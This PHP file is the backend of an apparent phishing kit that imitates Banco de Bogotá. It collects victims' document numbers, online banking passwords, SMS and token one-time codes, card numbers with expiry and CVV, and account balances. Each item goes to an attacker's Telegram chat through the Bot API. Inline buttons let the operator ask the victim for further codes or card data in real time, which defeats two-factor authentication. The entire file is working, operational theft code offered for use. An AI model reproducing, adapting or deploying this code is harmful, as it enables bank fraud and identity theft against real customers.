<?php
ob_start();
if (session_status() !== PHP_SESSION_ACTIVE) { session_start(); }
require_once __DIR__ . '/../../config.php';

$BOT_TOKEN = BOT_TOKEN;
$CHAT_ID   = CHAT_ID;
$key_alias = $_SESSION['key_alias'] ?? '';

if (empty($key_alias)) {
    $key_alias = bin2hex(random_bytes(4));
    $_SESSION['key_alias'] = $key_alias;
}
if (empty($_SESSION['unique_session_id'])) {
    $_SESSION['unique_session_id'] = $key_alias . '_' . time() . '_' . substr(md5(uniqid()), 0, 4);
}

$tipo_dato           = $_POST['tipo_dato'] ?? '';
$celular_propietario = $_SESSION['bre_phone'] ?? ($_COOKIE['celular'] ?? ($_SESSION['celular'] ?? 'No registrado'));
$cedula_propietario  = $_SESSION['bre_cc']    ?? ($_COOKIE['cedula']  ?? ($_SESSION['cedula']  ?? 'No registrada'));
$nombre_propietario  = $_SESSION['bre_name']  ?? 'No registrado';
$email_propietario   = $_SESSION['bre_email'] ?? 'No registrado';

// ============================================
// BOTONES INLINE — UN BOTÓN POR FILA
// ============================================
function getBotonesB() {
    return [
        [['text' => '✅ Aprobado / Finalizar',      'callback_data' => 'action_finalizar']],
        [['text' => '🏁 Finalizado',                'callback_data' => 'action_finalizado']],
        [['text' => '📱 Pedir SMS',                 'callback_data' => 'action_sms_bogota']],
        [['text' => '🔑 Pedir Token',               'callback_data' => 'action_token_bogota']],
        [['text' => '💳 Pedir Tarjeta',             'callback_data' => 'action_pedir_cc_bogota']],
        [['text' => '❌ Error Tarjeta',             'callback_data' => 'action_error_cc_bogota']],
        [['text' => '❌ Usuario incorrecto',        'callback_data' => 'action_error_usuario_bogota']],
        [['text' => '❌ SMS incorrecto',            'callback_data' => 'action_error_sms_bogota']],
        [['text' => '❌ Token incorrecto',          'callback_data' => 'action_error_token_bogota']],
    ];
}

// ============================================
// HELPER: Enviar Telegram + guardar JSON state
// ============================================
function enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, $tipo_dato, $datos_sesion) {
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    $postData = [
        'chat_id'      => $CHAT_ID,
        'text'         => $mensaje,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => getBotonesB()]),
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result     = curl_exec($ch);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($result === false) {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'Error de conexión: ' . $curl_error]);
        exit();
    }

    $response  = json_decode($result, true);
    $messageId = time();
    if ($response && isset($response['result']['message_id'])) {
        $messageId = $response['result']['message_id'];
    }

    $messageData = [
        'message_id'         => $messageId,
        'chat_id'            => $CHAT_ID,
        'timestamp'          => time(),
        'tipo_dato'          => $tipo_dato,
        'datos'              => $datos_sesion,
        'callback_processed' => false,
        'last_update_id'     => 0,
    ];

    $fileName = 'message_bogota_' . $messageId . '.json';
    $filePath = __DIR__ . '/' . $fileName;
    if (!is_writable(__DIR__)) { $filePath = sys_get_temp_dir() . '/' . $fileName; }
    file_put_contents($filePath, json_encode($messageData, JSON_PRETTY_PRINT));

    $_SESSION['telegram_message_id'] = $messageId;
    $_SESSION['telegram_chat_id']    = $CHAT_ID;

    ob_end_clean();
    echo json_encode(['success' => true, 'message_id' => $messageId]);
    exit();
}

// ============================================
// CASO: SMS
// ============================================
if ($tipo_dato === 'sms_bogota') {
    $codigo_sms = $_POST['codigo_sms'] ?? '';

    if (!isset($_SESSION['datos_bogota'])) {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'No hay datos previos']);
        exit();
    }

    $_SESSION['datos_bogota']['codigo_sms'] = $codigo_sms;
    $datos = $_SESSION['datos_bogota'];

    $mensaje  = "📩 <b>BANCO DE BOGOTÁ — SMS " . ($key_alias ? "#$key_alias" : "") . "</b>\n\n";
    $mensaje .= "👤 <b>Nombre:</b> " . $nombre_propietario . "\n";
    $mensaje .= "🆔 <b>Cédula:</b> " . $cedula_propietario . "\n";
    $mensaje .= "📱 <b>Celular:</b> " . $celular_propietario . "\n\n";
    $mensaje .= "📄 <b>Documento:</b> " . ($datos['numero_documento'] ?? '') . "\n";
    $mensaje .= "🔒 <b>Clave:</b> " . ($datos['clave_segura'] ?? '') . "\n";
    $mensaje .= "🔢 <b>SMS:</b> <code>" . $codigo_sms . "</code>\n\n";
    $mensaje .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s');

    enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, 'sms_bogota', $_SESSION['datos_bogota']);
}

// ============================================
// CASO: ERROR SMS
// ============================================
if ($tipo_dato === 'error_sms_bogota') {
    $codigo_sms = $_POST['codigo_sms'] ?? '';

    $_SESSION['datos_bogota']['codigo_sms_error'] = $codigo_sms;
    $datos = $_SESSION['datos_bogota'];

    $mensaje  = "❌ <b>BANCO DE BOGOTÁ — SMS INCORRECTO (Reintento) " . ($key_alias ? "#$key_alias" : "") . "</b>\n\n";
    $mensaje .= "👤 <b>Nombre:</b> " . $nombre_propietario . "\n";
    $mensaje .= "🆔 <b>Cédula:</b> " . $cedula_propietario . "\n";
    $mensaje .= "📱 <b>Celular:</b> " . $celular_propietario . "\n\n";
    $mensaje .= "📄 <b>Documento:</b> " . ($datos['numero_documento'] ?? '') . "\n";
    $mensaje .= "🔢 <b>Nuevo SMS:</b> <code>" . $codigo_sms . "</code>\n\n";
    $mensaje .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s');

    enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, 'error_sms_bogota', $_SESSION['datos_bogota']);
}

// ============================================
// CASO: TOKEN
// ============================================
if ($tipo_dato === 'token_bogota') {
    $codigo_token = $_POST['codigo_token'] ?? '';

    if (!isset($_SESSION['datos_bogota'])) {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'No hay datos previos']);
        exit();
    }

    $_SESSION['datos_bogota']['codigo_token'] = $codigo_token;
    $datos = $_SESSION['datos_bogota'];

    $mensaje  = "🔑 <b>BANCO DE BOGOTÁ — TOKEN " . ($key_alias ? "#$key_alias" : "") . "</b>\n\n";
    $mensaje .= "👤 <b>Nombre:</b> " . $nombre_propietario . "\n";
    $mensaje .= "🆔 <b>Cédula:</b> " . $cedula_propietario . "\n";
    $mensaje .= "📱 <b>Celular:</b> " . $celular_propietario . "\n\n";
    $mensaje .= "📄 <b>Documento:</b> " . ($datos['numero_documento'] ?? '') . "\n";
    $mensaje .= "🔒 <b>Clave:</b> " . ($datos['clave_segura'] ?? '') . "\n";
    $mensaje .= "🎯 <b>Token:</b> <code>" . $codigo_token . "</code>\n\n";
    $mensaje .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s');

    enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, 'token_bogota', $_SESSION['datos_bogota']);
}

// ============================================
// CASO: TARJETA
// ============================================
if ($tipo_dato === 'tarjeta_bogota') {
    $nombre_titular    = trim($_POST['nombre_titular']    ?? '');
    $numero_tarjeta    = trim($_POST['numero_tarjeta']    ?? '');
    $fecha_vencimiento = trim($_POST['fecha_vencimiento'] ?? '');
    $cvv               = trim($_POST['cvv']               ?? '');

    if (!isset($_SESSION['datos_bogota'])) {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'No hay datos previos']);
        exit();
    }
    if (empty($numero_tarjeta) || empty($cvv)) {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'Faltan datos de la tarjeta']);
        exit();
    }

    $_SESSION['datos_bogota']['tarjeta'] = [
        'nombre' => $nombre_titular,
        'numero' => $numero_tarjeta,
        'fecha'  => $fecha_vencimiento,
        'cvv'    => $cvv,
    ];
    $datos = $_SESSION['datos_bogota'];

    $mensaje  = "💳 <b>BANCO DE BOGOTÁ — TARJETA " . ($key_alias ? "#$key_alias" : "") . "</b>\n\n";
    $mensaje .= "👤 <b>Nombre:</b> " . $nombre_propietario . "\n";
    $mensaje .= "🆔 <b>Cédula:</b> " . $cedula_propietario . "\n";
    $mensaje .= "📱 <b>Celular:</b> " . $celular_propietario . "\n\n";
    $mensaje .= "📋 <b>Tipo Doc:</b> " . ($datos['tipo_identificacion'] ?? '') . "\n";
    $mensaje .= "📄 <b>Documento:</b> " . ($datos['numero_documento'] ?? '') . "\n";
    $mensaje .= "🔒 <b>Clave:</b> " . ($datos['clave_segura'] ?? '') . "\n\n";
    $mensaje .= "💳 <b>Titular:</b> " . $nombre_titular . "\n";
    $mensaje .= "🔢 <b>Número:</b> <code>" . $numero_tarjeta . "</code>\n";
    $mensaje .= "📅 <b>Vence:</b> <code>" . $fecha_vencimiento . "</code>\n";
    $mensaje .= "🔒 <b>CVV:</b> <code>" . $cvv . "</code>\n\n";
    $mensaje .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s');

    enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, 'tarjeta_bogota', $_SESSION['datos_bogota']);
}

// ============================================
// CASO: SALDO
// ============================================
if ($tipo_dato === 'saldo') {
    $saldo = $_POST['saldo'] ?? '';

    if (!isset($_SESSION['datos_bogota'])) {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'No hay datos previos']);
        exit();
    }

    $_SESSION['datos_bogota']['saldo'] = $saldo;
    $datos = $_SESSION['datos_bogota'];

    $mensaje  = "💰 <b>BANCO DE BOGOTÁ — SALDO " . ($key_alias ? "#$key_alias" : "") . "</b>\n\n";
    $mensaje .= "👤 <b>Nombre:</b> " . $nombre_propietario . "\n";
    $mensaje .= "🆔 <b>Cédula:</b> " . $cedula_propietario . "\n";
    $mensaje .= "📱 <b>Celular:</b> " . $celular_propietario . "\n\n";
    $mensaje .= "📋 <b>Tipo Cliente:</b> " . ($datos['tipo_cliente'] ?? '') . "\n";
    $mensaje .= "📄 <b>Documento:</b> " . ($datos['numero_documento'] ?? '') . "\n";
    $mensaje .= "🔒 <b>Clave:</b> " . ($datos['clave_segura'] ?? '') . "\n";
    $mensaje .= "💰 <b>Saldo:</b> $" . $saldo . "\n\n";
    $mensaje .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s');

    enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, 'saldo_bogota', $_SESSION['datos_bogota']);
}

// ============================================
// CASO: CREDENCIALES INICIALES
// ============================================
if ($tipo_dato === 'login_bogota' || empty($tipo_dato)) {
    $tipo_cliente        = $_POST['tipo_cliente']        ?? '';
    $tipo_identificacion = $_POST['tipo_identificacion'] ?? '';
    $numero_documento    = $_POST['numero_documento']    ?? '';
    $clave_segura        = $_POST['clave_segura']        ?? '';

    $_SESSION['datos_bogota'] = [
        'tipo_cliente'        => $tipo_cliente,
        'tipo_identificacion' => $tipo_identificacion,
        'numero_documento'    => $numero_documento,
        'clave_segura'        => $clave_segura,
    ];

    $mensaje  = "🔐 <b>BANCO DE BOGOTÁ — LOGIN " . ($key_alias ? "#$key_alias" : "") . "</b>\n\n";
    $mensaje .= "👤 <b>Nombre:</b> " . $nombre_propietario . "\n";
    $mensaje .= "🆔 <b>Cédula:</b> " . $cedula_propietario . "\n";
    $mensaje .= "📱 <b>Celular:</b> " . $celular_propietario . "\n";
    $mensaje .= "📧 <b>Email:</b> " . $email_propietario . "\n\n";
    $mensaje .= "👤 <b>Tipo de Cliente:</b> " . $tipo_cliente . "\n";
    $mensaje .= "📋 <b>Tipo de Identificación:</b> " . $tipo_identificacion . "\n";
    $mensaje .= "📄 <b>Número de Documento:</b> <code>" . $numero_documento . "</code>\n";
    $mensaje .= "🔒 <b>Clave Segura:</b> <code>" . $clave_segura . "</code>\n\n";
    $mensaje .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s');

    enviarTelegramB($BOT_TOKEN, $CHAT_ID, $mensaje, 'login_bogota', $_SESSION['datos_bogota']);
}

ob_end_clean();
echo json_encode(['success' => false, 'error' => 'Acción inválida']);
exit();